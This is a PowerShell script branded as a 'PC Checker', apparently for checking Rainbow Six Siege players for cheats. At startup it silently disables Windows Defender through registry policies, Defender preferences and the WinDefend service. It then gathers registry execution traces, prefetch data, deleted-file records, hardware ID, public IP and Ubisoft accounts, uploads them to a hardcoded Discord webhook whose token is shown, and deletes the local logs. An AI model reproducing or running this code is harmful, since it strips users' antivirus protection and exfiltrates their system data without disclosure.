$ascii0 = @"
 _______ _    _ ______   ____       _______ _______ _      ______   ________     ________ 
|__   __| |  | |  ____| |  _ \   /\|__   __|__   __| |    |  ____| |  ____\ \   / /  ____|
   | |  | |__| | |__    | |_) | /  \  | |     | |  | |    | |__    | |__   \ \_/ /| |__   
   | |  |  __  |  __|   |  _ < / /\ \ | |     | |  | |    |  __|   |  __|   \   / |  __|  
   | |  | |  | | |____  | |_) / ____ \| |     | |  | |____| |____  | |____   | |  | |____ 
   |_|  |_|  |_|______| |____/_/    \_\_|     |_|  |______|______| |______|  |_|  |______|



"@

$ascii1 = @"
  _____  _____  __          __  _______ _____ _    _ _____ _   _  _____ 
 |_   _|/ ____| \ \        / /\|__   __/ ____| |  | |_   _| \ | |/ ____|
   | | | (___    \ \  /\  / /  \  | | | |    | |__| | | | |  \| | |  __ 
   | |  \___ \    \ \/  \/ / /\ \ | | | |    |  __  | | | | .   | | |_ |
  _| |_ ____) |    \  /\  / ____ \| | | |____| |  | |_| |_| |\  | |__| |
 |_____|_____/      \/  \/_/    \_\_|  \_____|_|  |_|_____|_| \_|\_____|



"@

$ascii2 = @"
  _____   _____     _____  _____          _   _ _   _ ______ _____  
 |  __ \ / ____|   / ____|/ ____|   /\   | \ | | \ | |  ____|  __ \ 
 | |__) | |       | (___ | |       /  \  |  \| |  \| | |__  | |  | |
 |  ___/| |        \___ \| |      / /\ \ | .   | .   |  __| | |  | |
 | |    | |____    ____) | |____ / ____ \| |\  | |\  | |____| |__| |
 |_|     \_____|  |_____/ \_____/_/    \_\_| \_|_| \_|______|_____/ 



"@

$ascii3 = @"
  __  __          _____  ______    ______     __   __  __      __     ___    _ _____            
 |  \/  |   /\   |  __ \|  ____|  |  _ \ \   / /  |  \/  |   /\\ \   / / |  | |  __ \     /\    
 | \  / |  /  \  | |  | | |__     | |_) \ \_/ /   | \  / |  /  \\ \_/ /| |  | | |__) |   /  \   
 | |\/| | / /\ \ | |  | |  __|    |  _ < \   /    | |\/| | / /\ \\   / | |  | |  _  /   / /\ \  
 | |  | |/ ____ \| |__| | |____   | |_) | | |     | |  | |/ ____ \| |  | |__| | | \ \  / ____ \ 
 |_|  |_/_/    \_\_____/|______|  |____/  |_|     |_|  |_/_/    \_\_|   \____/|_|  \_\/_/    \_\



"@

$global:logEntries += @"
  __  __          _____  ______    ______     __   __  __      __     ___    _ _____            
 |  \/  |   /\   |  __ \|  ____|  |  _ \ \   / /  |  \/  |   /\\ \   / / |  | |  __ \     /\    
 | \  / |  /  \  | |  | | |__     | |_) \ \_/ /   | \  / |  /  \\ \_/ /| |  | | |__) |   /  \   
 | |\/| | / /\ \ | |  | |  __|    |  _ < \   /    | |\/| | / /\ \\   / | |  | |  _  /   / /\ \  
 | |  | |/ ____ \| |__| | |____   | |_) | | |     | |  | |/ ____ \| |  | |__| | | \ \  / ____ \ 
 |_|  |_/_/    \_\_____/|______|  |____/  |_|     |_|  |_/_/    \_\_|   \____/|_|  \_\/_/    \_\
.mayuraa ON DISCORD


"@



function ByeBye-Defender {
    param (
        [switch]$Force
    )

    $registryKeys = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    )

    $registryValues = @(
        "DisableAntiSpyware",
        "DisableRealtimeMonitoring",
        "DisableBehaviorMonitoring",
        "DisableOnAccessProtection",
        "DisableScanOnRealtimeEnable"
    )

    foreach ($key in $registryKeys) {
        if (!(Test-Path $key)) {
            New-Item -Path $key -Force | Out-Null
        }
        
        foreach ($value in $registryValues) {
            Set-ItemProperty -Path $key -Name $value -Value 1 -Type DWord -Force *>$null 2>&1
        }
    }

    Set-MpPreference -DisableRealtimeMonitoring $true *>$null 2>&1
    Set-MpPreference -DisableBehaviorMonitoring $true *>$null 2>&1
    Set-MpPreference -DisableIOAVProtection $true *>$null 2>&1
    Set-MpPreference -DisableScriptScanning $true *>$null 2>&1
    Set-MpPreference -DisableArchiveScanning $true *>$null 2>&1
    Set-MpPreference -MAPSReporting 0 *>$null 2>&1
    Set-MpPreference -SubmitSamplesConsent 2 *>$null 2>&1

    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue *>$null 2>&1
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue *>$null 2>&1
    sc.exe config WinDefend start= disabled | Out-Null
    net stop WinDefend | Out-Null
}



function Strip-ANSI {
    param([string]$txt)
    $ansi = [regex]"\x1B[@-_][0-?]*[ -/]*[@-~]"
    return $ansi.Replace($txt, "")
}



function Center-Text {
    param([string]$txt)
    
    $columns  = [System.Console]::WindowWidth
    $lines    = $txt -split "`n"
    
    foreach ($line in $lines) {
        $stripped  = Strip-ANSI $line
        $padding   = [math]::Floor(($columns - $stripped.Length) / 2)
        

        if ($padding -lt 0) {
            $padding = 0
        }
        
        Write-Host (" " * $padding + $line) -NoNewline  -ForegroundColor Cyan
        Write-Host $end
    }
}



function Add-LogEntry {
    param ([string]$category, [string]$message)
    $global:logEntries += "`n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`n$category`n$message"
}



function Scan-RegistryPath {
    param ([string]$path, [hashtable]$loggedPaths)
    if (Test-Path $path) {
        Get-ItemProperty -Path $path | ForEach-Object {
            $_.PSObject.Properties | ForEach-Object {
              
                if ($_.Name -and $_.Name -match "exe|\.rar" -and -not $loggedPaths.ContainsKey($_.Name)) {
                    Add-LogEntry ("$($_.Name)")
                    $loggedPaths[$_.Name] = $true
                }
            }
        }
    }
}



function Scan-PC {
    try {
        if (Get-Command Confirm-SecureBootUEFI -ErrorAction SilentlyContinue) {
            $secureBootState  = Confirm-SecureBootUEFI
            $statusColor      = if ($secureBootState) { "Green" } else { "Red" }
            Write-Host " `n    {x} Secure Boot is" -ForegroundColor Cyan -NoNewline; Write-Host " $($statusColor.ToUpper())" -ForegroundColor $statusColor
            Add-LogEntry "secure boot status" $secureBootState
       
        } else {
            Write-Host " `n    {x} Secure Boot not available on this system." -ForegroundColor Yellow
        }
  
    } catch {
        Write-Host " `n    {x} Unable to retrieve Secure Boot status: $_" -ForegroundColor Red
    }



    # Windows Install Date
    Write-Host "    {x} Finding Windows install date" -ForegroundColor Cyan
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    Add-LogEntry "windows install date" "$installDate"



    # Checking for .tlscan folders
    Write-Host " `n    {x} Looking for .tlscan folders" -ForegroundColor Cyan
    $recentDocsPath  = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
    $tlscanFound     = $false
    
    if (Test-Path $recentDocsPath) {
        Get-ChildItem -Path $recentDocsPath | ForEach-Object {
            if ($_.PSChildName -match "\.tlscan") {
                $tlscanFound  = $true
                $folderPath   = Get-ItemProperty -Path "$recentDocsPath\$($_.PSChildName)" -Name MRUListEx

                Add-LogEntry ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in " $folderPath
                Write-Host ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath" -ForegroundColor Red
            }
        }
    }
    if (-not $tlscanFound) { Write-Host "    {x} " -ForegroundColor Cyan -NoNewline; Write-Host "No .tlscan ext found" -ForegroundColor Green }



    # Scanning Registry
    Write-Host " `n    {x} Scanning Registry" -ForegroundColor Cyan
    $loggedPaths    = @{}
    $registryPaths  = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
        "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    )
    
    foreach ($registryPath in $registryPaths) {
        if (Test-Path $registryPath) {
            Get-ItemProperty -Path $registryPath | ForEach-Object {
                $_.PSObject.Properties | ForEach-Object {
                    
                    if (($_.Name -match "exe" -or $_.Name -match "\.rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                        Add-LogEntry "registry keys" $_.Name
                        $loggedPaths[$_.Name] = $true
                    }
                }
            }
        }
    }



    # Scanning Prefetch
    Write-Host "    {x} Scanning Prefetch" -ForegroundColor Cyan
    $prefetchPath = "C:\Windows\Prefetch"
   
    if (Test-Path $prefetchPath) {
        $pfFiles = Get-ChildItem -Path $prefetchPath -Filter *.pf -File
       
        if ($pfFiles) {
            Add-LogEntry "Prefetch Files" $pfFiles | ForEach-Object { "{0} | {1}" -f $_.Name, $_.LastWriteTime }
        
        } else {
            Write-Host "    {x} " -ForegroundColor Cyan -NoNewline; Write-Host "No .pf files found" -ForegroundColor Green
        }
   
    } else {
        Write-Host "    [!] Prefetch folder not found." -ForegroundColor Red
    }



    # Looking for loaders
    Write-Host "    {x} Looking for loaders" -ForegroundColor Cyan
    $loaderFiles = $global:logEntries | Where-Object { $_ -match "loader.*\.exe" }
   
    if ($loaderFiles) {
        Add-LogEntry "Loaders" $loaderFiles
    }



    # Looking for compressed files
    Write-Host "    {x} Looking for compressed files (this may take some time)" -ForegroundColor Cyan
    $searchPaths  = @($env:UserProfile, "$env:UserProfile\Downloads")
    $zipRarFiles  = Get-ChildItem -Path $searchPaths -Recurse -Include *.zip, *.rar -File | Where-Object { $_.FullName -notmatch "minecraft" }
   
    if ($zipRarFiles) {
        Add-LogEntry "Compressed Files" $zipRarFiles
    }



    # Looking for deleted files
    Write-Host "    {x} Looking for deleted files (this may take some time)" -ForegroundColor Cyan
    $deletedFilePath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath "$env:UserName-deleted.txt"
    fsutil usn readjournal c: csv | findstr /1 /c:.exe 2>$null | findstr /1 /c:0x80000200 2>$null >>$deletedFilePath



    # Ubisoft Accounts Check
    $paths = @(
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\conversations",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\game_stats",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\ownership",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\settings",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\ptdata",
        "C:\Users\$env:UserName\AppData\Local\Ubisoft Game Launcher\spool",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\club",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\savegames",
        "C:\Users\$env:UserName\Documents\My Games\Rainbow Six - Siege"
    )

    $uniqueNames = @{}

    foreach ($path in $paths) {
        if (Test-Path $path) {
            $items = Get-ChildItem -Path $path 

            foreach ($item in $items) {
                if ($item -is [System.IO.FileInfo]) {
                    $content = Get-Content $item.FullName -ErrorAction Stop
                }
            }
        }
    }

    $accountPath = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\settings"
    
    if (Test-Path $accountPath) {
        $accounts = Get-ChildItem -Path $accountPath -File
        Write-Host "    {x} " -ForegroundColor Cyan -NoNewline; Write-Host "$($accounts.Count) Account(s) found" -ForegroundColor Green
        $accounts | ForEach-Object {
            Start-Process "https://r6.tracker.network/r6siege/profile/ubi/$($_.Name)"
            Add-LogEntry "Ubisoft accounts" "https://r6.tracker.network/r6siege/profile/ubi/$($_.Name)"
        }
    }
}



function Send-Logs {
    $tempPath         = [System.IO.Path]::GetTempPath()
    $logFileName      = "$env:UserName-log.txt"
    $deletedFileName  = "$env:UserName-deleted.txt"
    $logFilePath      = Join-Path -Path $tempPath -ChildPath $logFileName
    $deletedFilePath  = Join-Path -Path $tempPath -ChildPath $deletedFileName
    $ipAddress        = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip

    if (Test-Path $logFilePath) {
        $url = "https://ptb.discord.com/api/webhooks/1316160688162603090/HPXs2uyzRi2JAWOaU7eFNpJnXc8kqjuUMAJRjmSxMsp5j26P-w4jxfcjo0IgP_G3ej2X"

        $pcUsername       = $env:UserName
        $systemName       = $env:COMPUTERNAME
        $hardwareId       = (Get-WmiObject -Query "Select * from Win32_ComputerSystemProduct").UUID
        $currentDateTime  = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

        $embed = @{
            username  = "Pc Checker"
            content   = ""
            embeds    = @(
                @{
                    title   = "PC Check Logs"
                    color   = 00000000
                    fields  = @(
                        @{
                            name    = "User"
                            value   = $pcUsername
                            inline  = $true
                        },
                       
                        @{
                            name    = "System"
                            value   = $systemName
                            inline  = $true
                        },
                        
                        @{
                            name    = "HWID"
                            value   = $hardwareId
                            inline  = $true
                        },
                        
                        @{
                            name    = "IP"
                            value   = "[$ipAddress](https://chimera.rip/____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________?ip=$ipAddress)"
                            inline  = $true
                        }
                    )
                    footer    = @{
                        text  = "Pc Checker | $currentDateTime"
                    }
                }
            )
        }

        $fileContent    = Get-Content -Path $logFilePath -Raw
        $multipartBody  = ""

        $boundary  = [System.Guid]::NewGuid().ToString()
        $LF        = "`r`n"
        
        $multipartBody += "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"payload_json`"$LF" +
            "Content-Type: application/json$LF$LF" +
            (ConvertTo-Json -Depth 10 -InputObject $embed) + $LF +
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"file`"; filename=`"$logFileName`"$LF" +
            "Content-Type: text/plain$LF$LF" +
            $fileContent + $LF

        if (Test-Path $deletedFilePath) {
            $deletedFileContent = Get-Content -Path $deletedFilePath -Raw
            $multipartBody += "--$boundary$LF" +
                "Content-Disposition: form-data; name=`"deletedFile`"; filename=`"$deletedFileName`"$LF" +
                "Content-Type: text/plain$LF$LF" +
                $deletedFileContent + $LF
        }

        $multipartBody += "--$boundary--$LF"

        try {
            Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $multipartBody | Out-Null
        }
       
        catch {
            Write-Host " `n [!] Failed to send log: $_" -ForegroundColor Red
        }
    }
   
    else {
        Write-Host " `n [!] Log file not found." -ForegroundColor Red
    }
}



function Main {
    Clear-Host
    Center-Text $ascii0
    Center-Text $ascii1
    $Host.UI.RawUI.WindowTitle = "Made by .mayuraa on Discord"
    ByeBye-Defender
    Clear-Host

    $tempPath           = [System.IO.Path]::GetTempPath()
    $logFilePath        = Join-Path -Path $tempPath -ChildPath "$env:UserName-log.txt"
    $deletedFileName    = "$env:UserName-deleted.txt"
    $deletedFilePath    = Join-Path -Path $tempPath -ChildPath $deletedFileName

    Scan-PC
    
    $global:logEntries | Out-File -FilePath $logFilePath -Encoding UTF8 -NoNewline
    Send-Logs
    Remove-Item -Path $logFilePath -Force
    Remove-Item -Path $deletedFilePath -Force

    Clear-host
    Center-Text $ascii2
    Center-Text $ascii3
}



Main
